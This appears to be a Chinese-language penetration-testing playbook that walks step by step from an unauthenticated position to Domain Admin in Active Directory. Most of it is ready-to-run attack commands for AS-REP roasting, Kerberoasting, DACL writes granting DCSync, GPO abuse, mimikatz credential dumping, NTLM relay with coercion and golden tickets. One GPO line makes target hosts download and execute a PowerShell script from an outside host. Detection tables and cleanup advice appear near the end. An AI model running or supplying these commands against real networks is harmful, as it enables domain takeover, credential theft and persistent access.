# AD 攻击路径全图：从普通域用户到 Domain Admin

> 被 `windows-ad` 引用。核心不是「能跑哪些工具」，而是**你手里这一格能走到下一格的哪条边**，
> 以及**走完这条边之后，用哪个日志字段能证明到了**。
>
> 读法：先按第一节定位自己在哪一格，再看那一格的「识别 → 命令 → 验伤」三列。
> 每一格都给了「看起来成功其实是假」的反例——这是本文件与普通工具速查表的分界。

## 一、路径总图（先看边，再看工具）

```
[无凭据]
  │ 1.匿名枚举（SRV/Null session/签名探测）
  ▼
[一个域用户名]（甚至没有密码）
  │ 2.AS-REP（无需预认证）→ 破密码
  ▼
[一个普通域用户]
  ├─ 3a.Kerberoast（有 SPN 的服务账号）→ 破密码 → 服务账号
  ├─ 3b.ACL 滥用（对高权对象有写边）→ 直接改密/加组/写 SPN
  ├─ 3c.ADCS 模板错配（ESC1/ESC8）→ 证书 → 任意用户
  ├─ 3d.GPO 控制（对 GPO 有写权 + 能链到 OU）→ 下发到主机
  └─ 3e.SIDHistory / 影子凭据 → 混入高权组
        ▼
[一个服务账号 / 一台已控主机]
  ├─ 4a.LSASS / DPAPI / 域缓存凭据 → 明文或哈希
  ├─ 4b.机器账户 + 强制认证 + 中继 → DC
  ├─ 4c.委派（非约束/约束/RBCD）→ 目标 SPN 的票
  └─ 4d.ADCS ESC8（HTTP 中继）→ DC 证书
        ▼
[域管 / 等价权限]
  │ 5.DCSync / 黄金票 / krbtgt → 持久
```

**判据一句话**：每一格都必须回答「我的凭据在这台机器/这个服务上**被接受**了吗」，
不是「我拿到了一个哈希/票/证书」。这条判据贯穿全文。

## 二、第 0 格：无凭据枚举（成本最低，先做）

### 识别

不需要任何账号，能拿到的东西比你想象的多：

| 能拿到 | 方法 | 价值 |
| --- | --- | --- |
| DC 的 IP 与名字 | DNS SRV 记录 | 决定后面所有 `-dc-ip` |
| 域功能级别 | 匿名 LDAP rootDSE | 判断能否用较新攻击面 |
| 可匿名读的共享 | null session | 常直接有脚本/配置文件 |
| SMB 签名关闭的主机列表 | `--gen-relay-list` | **中继路线是否成立** |
| 密码策略 | `--pass-pol` | 爆破阈值，锁定策略 |

### 命令

```bash
# DC 定位：三条路互相印证
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
dig +short corp.local NS
nxc smb 10.0.0.0/24 -u '' -p '' --gen-relay-list relay_targets.txt

# rootDSE（匿名 LDAP 也常能读）
ldapsearch -x -H ldap://10.0.0.10 -s base -b '' defaultNamingContext \
  domainFunctionality forestFunctionality

# null session 能读什么
nxc smb 10.0.0.10 -u '' -p '' --shares
nxc smb 10.0.0.10 -u '' -p '' --pass-pol
rpcclient -U '' -N 10.0.0.10 -c 'querydominfo;enumdomusers;enumdomgroups'
```

### 验伤

- `relay_targets.txt` 非空 → 不是「中继一定成」，而是**这些主机的 SMB 签名是关的**；
  还要再确认能强制认证（见 `relay-coercion-chain.md`）。
- `--pass-pol` 拿到 `Lockout threshold: None` → 爆破可行；`3` → 爆破基本不可行，改走 Kerberoast。

### 假阳性

- `nxc` 报 `STATUS_ACCESS_DENIED` 但 `--shares` 有输出 → 只是 `IPC$` 建连成功，**不代表有共享可读**。
- 域功能级别 2016 不代表没有 ESC1，**ADCS 与功能级别无关**。

## 三、第 1 格：只有一个域用户名（没有密码）

### 识别

AS-REP Roasting 的前提就是「该账号没勾选 Kerberos 预认证」（`userAccountControl` 含 `DONT_REQ_PREAUTH` = 0x400000）。
这是**唯一一种不需要任何凭据就能拿到可破哈希**的路径。

### 命令

```bash
# 有用户名字典就能打
impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.10 -usersfile users.txt \
  -format hashcat -outputfile asrep.hash -request

# 已有凭据时先筛出谁没开预认证
ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w 'pass' \
  -b 'DC=corp,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' \
  sAMAccountName userAccountControl

# 破：18200 = AS-REP etype23
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force
```

### 验伤

- 拿到明文后**必须真的登一次**：`nxc smb 10.0.0.10 -u svc_xxx -p '明文' -d corp.local`，
  看到 `[+] corp.local\svc_xxx:明文` 才算数。
- 哈希破解进度到 100% 但 `Recovered....: 0/1` → 字典不够，不是打失败。

### 假阳性

- 抓到了 AS-REP 但 hashcat 报 `Token length exception` → 是 `-format hashcat` 之外的格式（如 `john`），
  别以为是哈希坏了。
- 某些账号有 `DONT_REQ_PREAUTH` 但**已禁用**（`ACCOUNTDISABLE` 0x2），破出来也登不上。

## 四、第 2 格：普通域用户 → 服务账号（Kerberoast）

### 识别

任何域用户都能为**任意有 SPN 的账号**申请服务票（TGS），而票据里有一段用该账号密钥加密的密文，
离线可破。这是低权用户最稳定的产出。

```bash
# 列出所有有 SPN 的账号（排除机器账号，$ 结尾）
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.10 -request \
  -outputfile kerb.hash -request-user svc_sql

# 只要 RC4（13100 好破），AES 是 19700/19800 但慢很多
hashcat -m 13100 kerb.hash rockyou.txt
```

### 验伤

- 破出明文后登一次：`nxc smb 10.0.0.20 -u svc_sql -p '明文' -d corp.local --shares`。
- 票里 `etypes` 是 `23` 说明 RC4 可用；只有 `17/18` 说明域禁了 RC4，破解成本上升一个量级。

### 假阳性

- `GetUserSPNs` 输出「No entries found」→ 不是没得打，是**该账号没有读 SPN 的权限**（少见）
  或者 SPN 都挂在机器账号上（`$` 结尾被过滤掉了）。
- 破了但登录失败 → 该服务账号可能 `PasswordNeverExpires` 但**已被禁用**，或权限仅限本机服务登录（`SeServiceLogonRight`），不能走网络登录。

## 五、第 3 格：ACL 滥用（一条边直接到高权）

### 识别

ACL 是 AD 里最容易被忽略的攻击面：**谁对谁有写权限**。五种边值得记：

| 边（Right） | 含义 | 最短利用 |
| --- | --- | --- |
| `GenericAll` / `GenericWrite` | 对对象全权/写属性 | 改密码，或写 `servicePrincipalName` 再 Kerberoast |
| `WriteDacl` | 能改对象 ACL | 给自己加 `DS-Replication-Get-Changes-All` → DCSync |
| `WriteOwner` | 能改所有者 | 改成自己 → 再 `WriteDacl` |
| `ForceChangePassword` | 能强制重置密码 | 重置后直接登录（**会打断业务**） |
| `AddMember` / `Self-Member` | 能加组 | 加进 `Domain Admins` / `Enterprise Admins` |

### 命令

```bash
# 全量采集（有凭据）
bloodhound-python -d corp.local -u user -p pass -ns 10.0.0.10 -c All --zip

# 无 BloodHound 时：直接找对高权组的写边（需要域内读权限）
# 用 impacket 的 dacledit 读/写 DACL
impacket-dacledit -action read -target 'Domain Admins' \
  -principal user -dc-ip 10.0.0.10 corp.local/user:pass

# 落地：给自己加 DCSync 权限（复制目录更改）
impacket-dacledit -action write -rights DCSync -target-dn 'DC=corp,DC=local' \
  -principal user -dc-ip 10.0.0.10 corp.local/user:pass

# 落地：对计算机对象写 RBCD（见 relay/委派文档）
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'DC01$' -action write \
  -dc-ip 10.0.0.10 corp.local/user:pass

# 落地：改密码（会打断，先确认授权）
# Samba net 改他人密码（需对目标有 ForceChangePassword/User-Force-Change-Password）
net rpc password svc_victim 'P@ssw0rd!2026' -U 'CORP/user%pass' -S 10.0.0.10

# 或用 AD PowerShell（需 RSAT，明确存在）
Set-ADAccountPassword -Identity svc_victim -Reset `
  -NewPassword (ConvertTo-SecureString 'P@ssw0rd!2026' -AsPlainText -Force)
```

### 验伤

- `dacledit -action write` 返回成功不算数；**必须重读 DACL**：
  `impacket-dacledit -action read -target-dn 'DC=corp,DC=local' -principal user ...` 看到新 ACE。
- 写 DCSync 后立刻 `impacket-secretsdump -just-dc-user krbtgt corp.local/user:pass@10.0.0.10`，
  能拉出 `krbtgt:502:aad3b...` 才算**边真的通了**（DCSync 权限生效）。

### 假阳性

- BloodHound 上有边但打不动 → 常见是**继承被阻断**（对象设了 `Protect from accidental deletion` 或 ACL 继承关闭），
  或者目标在**另一个域**（跨域 ACE 不生效）。
- `dacledit` 报成功但重读没有 → 你需要的是 `WriteDacl` 而不是 `WriteProperty`，写错了权限位。
- 加了 DCSync 权限后拉不到 krbtgt → `DS-Replication-Get-Changes-All` 的 GUID 写错，或需要同时有 `DS-Replication-Get-Changes`。

## 六、第 4 格：GPO 控制（被低估的一条）

### 识别

对某个 GPO 对象有 `GenericWrite`，且该 GPO **link 到了包含目标主机的 OU** → 你能让目标主机执行任意配置。
两条落地方式：改本地管理员组成员（`Restricted Groups`）、加开机脚本/计划任务。

```bash
# 枚举 GPO 与链接（RSAT；无 RSAT 则用 LDAP 直查 gPLink）
Get-GPO -All | Select-Object DisplayName, Id, GpoStatus
Get-GPOReport -Name "Workstations Policy" -ReportType Xml -Path .\gpo.xml

# 无 RSAT 时：看某个 OU 上挂了哪些 GPO
ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w 'pass' \
  -b 'OU=Workstations,DC=corp,DC=local' '(objectClass=organizationalUnit)' gPLink

# 落地：用 pygpoabuse 给 GPO 加 Immediate Task（改本地管理员组）
python3 pygpoabuse.py corp.local/user:pass -gpo-id '<GPO_GUID>' -dc-ip 10.0.0.10 \
  -command "net localgroup administrators CORP\\user /add" -powershell

# 落地：加开机脚本式动作（同样走 Immediate Task，命令换成下载执行）
python3 pygpoabuse.py corp.local/user:pass -gpo-id '<GPO_GUID>' -dc-ip 10.0.0.10 \
  -command "powershell -nop -w hidden -c iwr http://10.0.0.99/a.ps1|iex"
```

> `-gpo-id` 是 GPO 的 GUID（`Get-GPO` 的 `Id` 字段），**不是显示名**。
> pygpoabuse 需要你对 GPO 的 `gPCMachineExtensionNames` / `gPCFileSysPath` 有写权限。

### 验伤

- 目标主机上 `gpupdate /force` 后，`net localgroup administrators` 里出现你的账号 → 边通了。
- 客户端侧日志 **1502/1503**（Group Policy 成功应用）能证明 GPO 真的下发到了这台机器。

### 假阳性

- GPO 改了但机器不生效 → **链路没到该 OU**（`gpresult /h` 看 `Not Applied` 的 reason），
  或者机器在 `Block Inheritance` 的 OU 下。
- 改 GPO 的 ACE 需要 `WriteProperty` 到 `groupPolicyContainer` 的特定属性；只加 `GenericWrite` 到 GPO 对象有时不够。

## 七、第 5 格：SIDHistory 与影子凭据

### 识别

`sIDHistory` 是「迁移遗留」：一个账号可以带另一个域/另一个账号的 SID，登录时**这些 SID 会进 token**。
如果 `sIDHistory` 里塞了 `Domain Admins` 的 SID，那这个普通账号就是域管。

```bash
# 谁有 sIDHistory
ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w 'pass' \
  -b 'DC=corp,DC=local' '(sIDHistory=*)' sAMAccountName sIDHistory

# 落地：给账号加 sIDHistory（需要对该账号有写权限 + 域管级 mimikatz）
mimikatz "privilege::debug" "sid::patch" "sid::add /sam:lowuser /new:administrator" "exit"
```

### 验伤

- 用该账号登录后 `whoami /groups` 里出现 `CORP\Domain Admins` 且 `Mandatory Label` 是 High → 真的带了。
- `klist` 里的 PAC 含额外组 SID → 服务端会认这个组。

### 假阳性

- `sid::add` 报成功但 `whoami /groups` 没有 → 需要**重新登录**（新 token 才会重建），老会话不会变。
- SIDHistory 在**跨林**场景会被 SID Filtering 拦掉（默认开启），同林内才有效。

## 八、第 6 格：已控主机 → 域凭据

### 识别与优先级

一台已控主机上有四种凭据源，**优先级从高到低**：

| 来源 | 拿到什么 | 为什么优先 |
| --- | --- | --- |
| 域缓存凭据（`SECURITY` 里的 `msCacheV2`） | 最近 10 个登录过本机的域账号哈希 | 往往包含域管（他们登过这台机器） |
| LSASS 内存 | 明文/NTLM/TGT/服务票 | 有明文最省事 |
| LSA Secrets | 服务账号密码、自动登录密码 | 常有 `DefaultPassword` |
| 本地 SAM | 本地账号哈希 | 只用于本机提权与哈希复用 |

```bash
# 一把梭（需要管理员）
impacket-secretsdump corp.local/localadmin:'P@ss'@10.0.0.20 -just-dc-user administrator
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

# 域缓存哈希破（msCacheV2）
hashcat -m 2100 cached.hash rockyou.txt

# 本机 mimikatz（若允许落地）
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "lsadump::secrets" "exit"
```

### 验伤

- 缓存哈希破出明文后，`nxc smb 10.0.0.10 -u 域管 -p 明文 -d corp.local` 成功 → 才叫「跳到域用户」。
- 哈希复用：`nxc smb 10.0.0.20 -u administrator -H <nthash> -d corp.local`，`(Pwn3d!)` 才是管理员权限。

### 假阳性

- `secretsdump` 输出一堆 `:*:` 空哈希 → 那是**空密码账号**或解密失败的行，不要当战果。
- LSASS 有 NTLM 哈希但目标禁了 NTLM（`RestrictNTLM`）→ PtH 会失败，得走 Overpass-the-Hash。

## 九、第 7 格：机器账户 + 强制认证 + 中继（不破密码）

这条路的详细内容在 `relay-coercion-chain.md`，这里只标它在全图里的位置：

```bash
# 前提：relay_targets.txt 非空（签名关）+ 能强制某台机器认证
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -t ldaps://10.0.0.10 --add-computer
coercer coerce -u user -p pass -d corp.local -t 10.0.0.20 --always-continue
# 建出的机器账号 → RBCD → S4U → DC
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'DC01$' -action write -dc-ip 10.0.0.10 corp.local/user:pass
impacket-getST -spn 'cifs/dc01.corp.local' -impersonate administrator \
  -hashes :<EVIL_NTHASH> corp.local/'EVIL$' -dc-ip 10.0.0.10
```

**验伤**：`ntlmrelayx` 打出 `Authenticating connection from CORP/DC01$` + `LDAP session ... created computer` 两条，
缺任一条都不算。反例：只看到 `Received connection` 没看到 `Authenticating` = **只是连上，没中继成功**。

## 十、第 8 格：收尾（域管之后）

```bash
# DCSync：拉 krbtgt（= 永久域权限）
impacket-secretsdump -just-dc corp.local/da:pass@10.0.0.10

# 黄金票
impacket-ticketer -nthash <krbtgt_nthash> -domain-sid S-1-5-21-xxx -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass dc01.corp.local
```

**红线**：DCSync / 黄金票 / 改域策略在演练里通常只需**证明可行**（比如只拉一个非关键账号的哈希），
不真拉 krbtgt——因为 krbtgt 一旦被改，整个域要两次重置密码才恢复。

## 十一、每格通用检查表

打任何一格之前，先填这五行，缺一行就会在报告里说不清：

```
principal   我是谁（域名\账号 / SID）
edge        我借哪条边（ACL 权限名 / 模板名 / 委派类型 / 缓存条目）
artifact    我拿到什么（哈希 / 票 / 证书 / 明文）
accepting   哪个服务接受了它（主机 + 服务 + 协议）
effect      我多了什么能力（新组 / 新登录 / 能读哪个共享）
```

## 十二、检测视角：防守方看哪里

| 手法 | 日志 / 事件 | 具体信号 |
| --- | --- | --- |
| AS-REP | DC 4768 | `Pre-Authentication Type = 0`，同一源 IP 批量 |
| Kerberoast | DC 4769 | `Ticket Encryption Type = 0x17`(RC4) 且 `Service Name` 非 `krbtgt`，单账号短时多张 |
| ACL 写入 | DC 5136 | `objectClass=group`/`user` 的 `nTSecurityDescriptor` 被改；或 4662 含 `WriteDACL` |
| DCSync | DC 4662 | 非 DC 机器账号请求 `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`（Get-Changes-All） |
| GPO 改脚本 | DC 5136 + 客户端 1502 | `gPCFileSysPath`/`gPCMachineExtensionNames` 被改，随后 OU 内主机批量应用 |
| sIDHistory 写入 | DC 5136 | `sIDHistory` 属性新增；配合 4768 出现「低权账号带高权 SID」的 PAC |
| 域缓存 dump | 主机 4656/4663 + Sysmon 10 | 进程访问 `C:\Windows\System32\config\SECURITY` 或 `lsass.exe`（`GrantedAccess 0x1010`） |
| 强制认证 | 主机 4624 Type3 + 5156 | 机器账号向非 DC 地址发起 SMB/LDAP 认证（尤其 `DC01$` 主动外连） |

**响度排序（从吵到静）**：AS-REP 批量 > Kerberoast 批量 > 强制认证（5156 一眼可见）> ACL 写入（5136 有审计才看得见）> DCSync（一响就终局）。

## 十三、常见坑（跨格通用）

1. **把「有边」当「通了」**。BloodHound 只是图，边要落地一次（改完重读、登录一次、拉一次数据）才算。
2. **忽略账号状态位**。`ACCOUNTDISABLE`(0x2)、`LOCK_OUT`、`PASSWORD_EXPIRED` 任何一个都会让「破出来的密码」登不上，
   先读一次 `userAccountControl`：
   ```bash
   nxc ldap 10.0.0.10 -u user -p pass --users | grep -i svc_victim
   # 或用 LDAP 精确查单个账号
   ldapsearch -x -H ldap://10.0.0.10 -D 'user@corp.local' -w pass \
     -b 'DC=corp,DC=local' '(sAMAccountName=svc_victim)' userAccountControl
   ```
3. **AES-only 域里用 RC4 打**。`KRB_AP_ERR_ENC` / `KDC_ERR_ETYPE_NOSUPP` 常见，改 `-aes` 或先确认 `msDS-SupportedEncryptionTypes`。
4. **DC 时间偏移**。Kerberos 容忍 5 分钟；`kinit` 报 `Clock skew too great` 时先 `ntpdate 10.0.0.10`，不要怀疑密码。
5. **不清理就收工**。RBCD 写入、加的 DACL、建出来的 `EVIL$` 机器账号、GPO 脚本都会留成后门；
   演练结束必须逐项回滚，否则复核时会被当成「真实失陷」。